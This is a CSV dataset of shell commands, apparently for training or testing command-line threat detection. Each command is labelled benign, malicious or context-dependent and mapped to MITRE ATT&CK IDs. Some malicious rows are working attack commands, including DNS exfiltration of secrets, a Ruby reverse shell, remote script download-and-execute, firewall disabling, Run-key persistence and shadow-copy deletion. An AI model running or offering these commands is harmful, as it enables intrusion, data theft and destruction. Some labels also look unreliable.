command,label,original_label,mitre_id
pnmhisteq [-g|-grey] path/to/input.pnm > path/to/output.pnm,Benign,Benign,Benign
whoami /logonid,Benign,Benign,Benign
openssl < /dev/null s_client -connect host:port,Benign,Benign,Benign
gimp path/to/image1 path/to/image2 ...,Benign,Benign,Benign
svcadm enable service_name,Benign,Benign,Benign
shiori serve --port 8181,Benign,Benign,Benign
"rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},DefaultInstall_SingleUser,1,",Malicious,Malicious,T1218
"dig @$attacker_dns_server -p $dns_port $(echo ""$secret_info"" | base64).google.com",Malicious,Malicious,T1048
declare -a variable=(item_a item_b item_c),Benign,Benign,Benign
systemctl log-level emerg|alert|crit|err|warning|notice|info|debug,Benign,Benign,Benign
"find $1 \( -name ""*$2"" -o -name "".*$2"" \) -print",Benign,Benign,Benign
sudo [-i|--login] [-u|--user] user,Benign,Benign,Benign
ar r /path/to/output-file /path/to/input-file,Context_Dependent,Malicious,T1005
copy %SystemRoot%\System32\cscript.exe %APPDATA%\notepad.exe /Y,Malicious,Malicious,T1036
pnmcrop [-m|-margin] n [-blan|-blank-image] pass|minimize|maxcrop path/to/image.pnm > path/to/output.pnm,Benign,Benign,Benign
Connect-MgGraph,Malicious,Malicious,T1021
find . -name *.bar -maxdepth 2 -print,Benign,Benign,Benign
"ssh askapache 'nice -n 19 sh -c ""( ( nohup chown -R ask:ask /www/askapache.com &>/dev/null ) & )""'",Context_Dependent,Benign,Benign
standard --global variable,Benign,Benign,Benign
nikto -h http://10.0.0.1,Context_Dependent,Synthetic,Synthetic
find source/directory -ctime -2 | cpio -pvdm /my/dest/directory,Benign,Benign,Benign
"Rename-Item -Path ""path\to\file"" -NewName ""new_file_name"" [-Confirm|-cf]",Benign,Benign,Benign
"Get-Item -Path ""HKCU:Software\Microsoft\Windows\CurrentVersion\RunServices""",Context_Dependent,Malicious,T1012
termdown 1m30s,Benign,Benign,Benign
"kubectl set resources [deploy|deployment]/deployment_name --limits cpu=cpu_limit,memory=memory_limit",Benign,Benign,Benign
hexo clean,Benign,Benign,Benign
r2e add feed_name feed_URI,Benign,Benign,Benign
"dcode -rev ""hello world""",Benign,Benign,Benign
devspace dev,Benign,Benign,Benign
xattr -d com.apple.quarantine,Malicious,Malicious,T1553
mkdir -p ~/temp/bluecove/target/,Benign,Benign,Benign
tldr rabbitmqctl users,Benign,Benign,Benign
sudo sport install $(< path/to/list),Benign,Benign,Benign
sudo arptables [-D|--delete] INPUT rule_number,Benign,Benign,Benign
ksshell -i /path/to/input-file,Context_Dependent,Malicious,T1005
behat --out path/to/file,Benign,Benign,Benign
sstat [-e|--helpformat],Benign,Benign,Benign
gvgen -?,Benign,Benign,Benign
find . -perm -a+r -perm /a+w ! -perm /a+x,Benign,Benign,Benign
"date ""$NOW""",Malicious,Malicious,T1070
last nobody,Context_Dependent,Synthetic,Synthetic
alpaca --list-chats,Benign,Benign,Benign
cupsctl --remote-admin|--no-remote-admin,Benign,Benign,Benign
prettier --config path/to/config_file path/to/file,Benign,Benign,Benign
find / -name \*.dbf -print0 | xargs -0 -n1 dirname | sort | uniq,Context_Dependent,Benign,Benign
gh issue [new|create] [-w|--web],Benign,Benign,Benign
GetADUsers.py -all -dc-ip domain_controller_ip -hashes LM_Hash:NT_Hash domain/username,Benign,Benign,Benign
aws rds modify-db-instance --db-instance-identifier instance_identifier parameters --apply-immediately,Benign,Benign,Benign
scoop list,Benign,Benign,Benign
diff-pdf --view path/to/a.pdf path/to/b.pdf,Benign,Benign,Benign
duckdb -f path/to/script.sql,Benign,Benign,Benign
cp -r ../include/gtest ~/usr/gtest/include/,Benign,Benign,Benign
gcc --version,Benign,Benign,Benign
jira sprint [ls|list],Benign,Benign,Benign
public class TokenAdjuster {,Malicious,Malicious,T1562
Get-WUHistory -MaxDate (Get-Date).AddDays(-1),Benign,Benign,Benign
ri,Benign,Benign,Benign
"find /Applications/ -name ""*.java"" -print0 | xargs -0 grep -i ""TODO""",Benign,Benign,Benign
shutdown -h 1300,Benign,Benign,Benign
mount /dev/sda1 /mnt/,Malicious,Malicious,T1059
pio --version,Benign,Benign,Benign
"cat searches.txt| xargs -I {} -d, -n 1 grep -r {}",Benign,Benign,Benign
sudo setfiles /etc/selinux/targeted/contexts/files/file_contexts path/to/directory [-v|--verbose],Benign,Benign,Benign
termusic --help,Benign,Benign,Benign
py-spy top [-p|--pid] pid,Benign,Benign,Benign
gdb -batch -p 2 -ex 'info proc mappings',Context_Dependent,Synthetic,Synthetic
systemd-cgtop,Benign,Benign,Benign
fluxctl --k8s-fwd-ns=namespace list-workloads,Benign,Benign,Benign
distrobox-enter container_name,Benign,Benign,Benign
"&""$PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1"" -LogPath $filepath",Malicious,Malicious,T1056
buku [-w|--write] bookmark_id,Benign,Benign,Benign
uname -n,Context_Dependent,Synthetic,Synthetic
zsync -q path/to/url.zsync,Benign,Benign,Benign
sudo chown -R xxx /Users/xxx/Library/Developer/Xcode/Templates,Benign,Benign,Benign
find /srv/${x} -mindepth 1 -type f -not -amin -10080 -exec rm {} \;,Benign,Benign,Benign
yarn init,Benign,Benign,Benign
wsl-open -w,Benign,Benign,Benign
somecommand | true,Benign,Benign,Benign
"{(""[*]"" + $user.UserPrincipalName + ""["" + $prop + ""]"" + "" : "" + $user.$prop) | out-file -filepath $env:temp\T1552.005Test1.txt -append -force}}}",Malicious,Malicious,T1552
plasma-apply-colorscheme BreezeLight,Benign,Benign,Benign
"echo ""command"" | at 1000",Benign,Benign,Benign
virt-xml domain --edit --option suboption=new_value,Benign,Benign,Benign
"find ""$DELETEDIR"" -mindepth 1 -depth -type d -empty -exec rmdir ""{}"" \;",Benign,Benign,Benign
complete -p command,Benign,Benign,Benign
in2csv data.dbf > data.csv,Benign,Benign,Benign
find / -group managers -print,Context_Dependent,Benign,Benign
find . -type f -iname '*.txt' -print0 | xargs -0 mv {} {}.abc,Benign,Benign,Benign
rdfind -deleteduplicates true -ignoreempty false path/to/directory,Benign,Benign,Benign
plasma-apply-desktoptheme --list-themes,Benign,Benign,Benign
find -print0 | sort -z | cpio -pdv0 ../new,Benign,Benign,Benign
rlwrap /bin/sh,Malicious,Malicious,T1059
find . -maxdepth 1 -size 0c -exec rm {} \;,Benign,Benign,Benign
awslogs get /aws/lambda/my_lambda_group --filter-pattern 'ERROR',Benign,Benign,Benign
find . -inum 968746 -exec rm -i {} \;,Benign,Benign,Benign
sudo xdp-filter load [-p|--policy] allow [-m|--mode] skb network_interface,Benign,Benign,Benign
"find . -type f -maxdepth 1 -exec sed -i ""s/$P_FROM/$P_TO/g"" {} \;",Benign,Benign,Benign
infection --log-verbosity default|all|none,Benign,Benign,Benign
robocopy path\to\source_directory path\to\destination_directory *.jpg *.bmp,Benign,Benign,Benign
"docker [stats|container stats] --format "".Name:\t.CPUPerc""",Benign,Benign,Benign
"ack [-c|--count] [-l|--files-with-matches] ""search_pattern""",Benign,Benign,Benign
pgmhist [-me|-median] path/to/image.pgm,Benign,Benign,Benign
find -mindepth 0 -maxdepth 0,Benign,Benign,Benign
qalc --list-functions|list-prefixes|list-units|list-variables,Benign,Benign,Benign
py path\to\file.py,Benign,Benign,Benign
"tmux new-session -s vims -n vim0 -d ""vim foo""",Benign,Benign,Benign
mysql_secure_installation,Benign,Benign,Benign
rustup set auto-self-update enable|disable|check-only,Benign,Benign,Benign
ethtool [-i|--driver] eth0,Benign,Benign,Benign
pg_test_fsync [-f|--filename] path/to/file,Benign,Benign,Benign
sc query state= all,Context_Dependent,Malicious,T1007
nmap -sS 10.10.10.10,Context_Dependent,Synthetic,Synthetic
gammastep -t 5700:3600,Benign,Benign,Benign
fincore --output-all path/to/file,Benign,Benign,Benign
tldr set-nodeversion,Benign,Benign,Benign
git maintenance run --task commit-graph|gc|incremental-repack|loose-objects|pack-refs|prefetch,Benign,Benign,Benign
"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile"" /v ""EnableFirewall"" /t REG_DWORD /d 0 /f",Malicious,Malicious,T1562
"taskName = ""OpenCalcTask""",Malicious,Malicious,T1137
"ruby -rsocket -e'f=TCPSocket.open(""10.0.0.5"",9001).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",Malicious,Synthetic,Synthetic
az lock list,Benign,Benign,Benign
slurmrestd -a authentication_plugins [host]:port|unix:/path/to/socket,Benign,Benign,Benign
wp plugin install plugin --activate,Benign,Benign,Benign
chroma [-l|--lexer] python path/to/source_file.py,Benign,Benign,Benign
watch --interval=10 lynx -dump http://dslrouter/stats.html,Benign,Benign,Benign
sngrep -crI path/to/file.pcap,Benign,Benign,Benign
diskshadow delete shadows all,Malicious,Malicious,T1490
"echo ""# Required-Start: \$all"" >> /etc/init.d/T1543.002",Malicious,Malicious,T1543
jj [desc|describe],Benign,Benign,Benign
find / -type l -print0 | xargs -0 file | grep broken,Context_Dependent,Benign,Benign
collectd,Benign,Benign,Benign
Get-History -Id id,Benign,Benign,Benign
dig internal.corp,Context_Dependent,Synthetic,Synthetic
lvm_import_vdo [-n|--name] vg_name/lv_name /dev/mapper/vdo_volume,Benign,Benign,Benign
netperf address,Benign,Benign,Benign
ash,Malicious,Malicious,T1059
numlockx off,Benign,Benign,Benign
calligraflow --help|version,Benign,Benign,Benign
logcat --pid pid,Benign,Benign,Benign
rdp_check.py domain/username@target,Benign,Benign,Benign
tar -cvzf $output_file $input_file_folder,Malicious,Malicious,T1560
find / -name ssh|grep bin|xargs dirname,Context_Dependent,Benign,Benign
setarch x86_64 bash,Benign,Benign,Benign
npm token create --publish,Benign,Benign,Benign
ROPgadget --binary path/to/binary --depth nbyte,Benign,Benign,Benign
vercel [-e|--env] ENV=var,Benign,Benign,Benign
dpkg-reconfigure console-setup,Benign,Benign,Benign
browsh [-h|--help],Benign,Benign,Benign
ls -la /var/tmp/,Context_Dependent,Synthetic,Synthetic
aws accessanalyzer update-analyzer --analyzer-arn analyzer_arn --tags new_tags,Benign,Benign,Benign
stty [-a|--all],Benign,Benign,Benign
API:{uuid},Malicious,Malicious,T1558
"Service Control Manager/7045;winupd,%SystemRoot%\winupd.exe,user mode service,demand start,LocalSystem",Malicious,Malicious,T1569
sudo gitlab-runner register --url https://gitlab.example.com --registration-token token --name name --executor docker,Benign,Benign,Benign
zmv -v '(*).log' '$1.txt',Benign,Benign,Benign
dtc -I fs -O dts /proc/device-tree,Benign,Benign,Benign
pi --bibliography,Benign,Benign,Benign
brew bundle cleanup --force,Benign,Benign,Benign
find -name ‘*exp_to_find_in_folders*’ -exec rename “s/exp_to_find_for_replacement/exp_to_replace/” {} \;,Benign,Benign,Benign
w | awk '{print $1}',Context_Dependent,Benign,Benign
tac [-b|--before] path/to/file1 path/to/file2 ...,Benign,Benign,Benign
stripe trigger charge.succeeded,Benign,Benign,Benign
fsianycpu.exe,Malicious,Malicious,T1059
script [-h|--help],Benign,Benign,Benign
ghost restart,Benign,Benign,Benign
tldr chromium,Benign,Benign,Benign
phpbu --limit=backup_task_name,Benign,Benign,Benign
kdesrc-build --initial-setup,Benign,Benign,Benign
find . -name aaa -print,Benign,Benign,Benign
pico path/to/file,Benign,Benign,Benign
devenv --clean --offline,Benign,Benign,Benign
"find / -type f|egrep ""/[^/]{0,24}$""",Context_Dependent,Benign,Benign
lsof -i :27017,Context_Dependent,Synthetic,Synthetic
ng [b|build] --output-path path/to/directory,Benign,Benign,Benign
forfiles.exe,Malicious,Malicious,T1202
"find . -type f -exec stat -c ""%s %N"" {} \;",Benign,Benign,Benign
dlv test,Benign,Benign,Benign
Process32First,Malicious,Malicious,T1106
"perl -ple '' `find . -name ""file*""`",Benign,Benign,Benign
fdupes path/to/directory,Benign,Benign,Benign
sudo btrfs [c|check] path/to/partition,Benign,Benign,Benign
fprintd-delete username [-f|--finger] left-thumb|left-index-finger|left-middle-finger|left-ring-finger|left-little-finger|right-thumb|...,Benign,Benign,Benign
ghcid --height=height --width=width path/to/Main.hs,Benign,Benign,Benign
calibredb search search_term,Benign,Benign,Benign
iex,Benign,Benign,Benign
zdb,Benign,Benign,Benign
Set-PSReadLineOption -HistorySavePath {File Path},Malicious,Malicious,T1562
dolt clone --aws-region region_name repository_url,Benign,Benign,Benign
sudo eclean packages,Benign,Benign,Benign
gdc -fintfc,Benign,Benign,Benign
od --read-bytes=2 my_driver,Benign,Benign,Benign
find $HOME -name \*txt -o -name \*html -print0,Benign,Benign,Benign
grunt --help,Benign,Benign,Benign
cipher /e:path\to\file_or_directory,Benign,Benign,Benign
sudo rusnapshot [-c|--config] path/to/config.toml --cr,Benign,Benign,Benign
"read -r -n 1 -p ""${1:-Continue?} [y/n]: "" REPLY",Benign,Benign,Benign
upt info package,Benign,Benign,Benign
pw-config [-n|--name] pipewire-pulse.conf list,Benign,Benign,Benign
papermc start,Benign,Benign,Benign
"find . -depth -name ""blabla*"" -type f | xargs rm -f",Benign,Benign,Benign
swc path/to/input_directory --ignore path/to/ignored_file1 path/to/ignored_file2 ...,Benign,Benign,Benign
"mas lucky ""search_term""",Benign,Benign,Benign
git merge-index git-merge-one-file -- path/to/file,Benign,Benign,Benign
Projucer --create-project-from-pip path/to/PIP path/to/output,Benign,Benign,Benign
drush pmu foo,Benign,Benign,Benign
"find . –iname ""error"" –print ( -i is for ignore ) find . –iname ""error"" –print ( -i is for ignore )",Benign,Benign,Benign
aws command help,Benign,Benign,Benign
awk '{print $1}' file2 | comm -1 -3 file1 - | join file2 -,Benign,Benign,Benign
find -iname '.#*',Benign,Benign,Benign
popeye [-n|--namespace] namespace,Benign,Benign,Benign
"find /usr -name core -atime +7 -exec rm ""{}"" \;",Benign,Benign,Benign
exercism configure,Benign,Benign,Benign
"find . -name ""*sh*""",Benign,Benign,Benign
"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 ""$inf_to_execute""",Malicious,Malicious,T1218
vkpurge list version,Benign,Benign,Benign
xcopy path\to\file_or_directory path\to\destination_directory /z,Benign,Benign,Benign
command | sed -E 's/(apple)/\U\1/g',Benign,Benign,Benign
pypy -i path/to/file.py,Benign,Benign,Benign
conda install --upgrade package,Benign,Benign,Benign
rig -c number,Benign,Benign,Benign
abspath=$(readlink -e $path),Benign,Benign,Benign
MpCmdRun.exe -DownloadFile -url $remote_file -path $local_path,Malicious,Malicious,T1105
shift n,Benign,Benign,Benign
pkgstats search search_term [-l|--limit] count,Benign,Benign,Benign
crictl inspect container_id1 container_id2 ...,Benign,Benign,Benign
"find -maxdepth 1 -iname ""*.txt""",Benign,Benign,Benign
fabric < path/to/input_file [-p|--pattern] pattern_name,Benign,Benign,Benign
whatweb website1 website2 ...,Benign,Benign,Benign
find -type f -maxdepth 1 -writable,Benign,Benign,Benign
curl https://raw.github.com/creationix/nvm/master/install.sh | sh,Benign,Benign,Benign
from --sender=me@example.com,Benign,Benign,Benign
miniserve path/to/file,Benign,Benign,Benign
gdbus monitor --session,Benign,Benign,Benign
steamos-select-branch stable,Benign,Benign,Benign
figlist,Benign,Benign,Benign
"find / -name ""*conf"" -mtime 7",Context_Dependent,Benign,Benign
"printf ""header1,header2\nbar,foo\n"" | column [-t|--table] [-s|--separator] ,",Benign,Benign,Benign
playerctl previous,Benign,Benign,Benign
poetry export [-o|--output] requirements.txt [-f|--format] requirements.txt,Benign,Benign,Benign
ppmtolj [-r|-resolution] 75|100|150|300|600 path/to/input.ppm > path/to/output.lj,Benign,Benign,Benign
"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v NetWire /t REG_SZ /d ""C:\Users\admin\AppData\Roaming\Install\Host.exe"" /f",Malicious,Malicious,T1112
"nhentai --cookie ""csrftoken=TOKEN; sessionid=ID""",Benign,Benign,Benign
sdelete -p 3 path\to\file1 path\to\file2 ...,Benign,Benign,Benign
qgis [-n|--nologo],Benign,Benign,Benign
dir c:\ >> %temp%\download,Context_Dependent,Malicious,T1083
zfs snapshot pool_name/filesystem_name@snapshot_name,Benign,Benign,Benign
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1'),Context_Dependent,Malicious,T1082
gdb [-c|--core] path/to/core path/to/executable -iex 'set debuginfod enabled on' -iex 'set pagination off' -ex bt,Benign,Benign,Benign
df [-T|--print-type],Benign,Benign,Benign
tldr ln,Benign,Benign,Benign
tldr pkgctl db update,Benign,Benign,Benign
idevicedate,Benign,Benign,Benign
Remove-ItemProperty -Path $registryPath -Name $newValueName,Malicious,Malicious,T1562
stylua --check path/to/file,Benign,Benign,Benign
rake task,Benign,Benign,Benign
rpicam-jpeg [-o|--output] path/to/file.jpg --shutter 20000 --gain 1.5,Benign,Benign,Benign
IPXNET startserver,Benign,Benign,Benign
"cvs import -m ""message"" project_name version vendor",Benign,Benign,Benign
Add-Type -AssemblyName System.Windows.Forms,Malicious,Malicious,T1113
"find ./ -type f -exec grep -l ""Text To Find"" {} \;",Benign,Benign,Benign
"cd ""PathToAtomicsFolder\ExternalPayloads\""",Malicious,Malicious,T1001
mountpoint path/to/directory,Benign,Benign,Benign
smbclient [-U|--user] domain/username //server/share [-D|--directory] path/to/directory [-c|--command] 'get filename',Benign,Benign,Benign
HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows,Malicious,Malicious,T1060
exec 3>path/to/file,Benign,Benign,Benign
stress-ng [-m|--vm] 2 --vm-bytes 512M [-t|--timeout] 30s,Benign,Benign,Benign
find / -ctime +3,Context_Dependent,Benign,Benign
pie info vendor/extension,Benign,Benign,Benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\Windows\Temp\payload.exe /f,Malicious,Synthetic,Synthetic
nl [-i|--line-increment] increment path/to/file,Benign,Benign,Benign
sar -n DEV 2 10,Benign,Benign,Benign
aiac get mongo query that aggregates all documents by created date,Benign,Benign,Benign
lualatex path/to/file.tex,Benign,Benign,Benign
packwiz modrinth|curseforge export,Benign,Benign,Benign
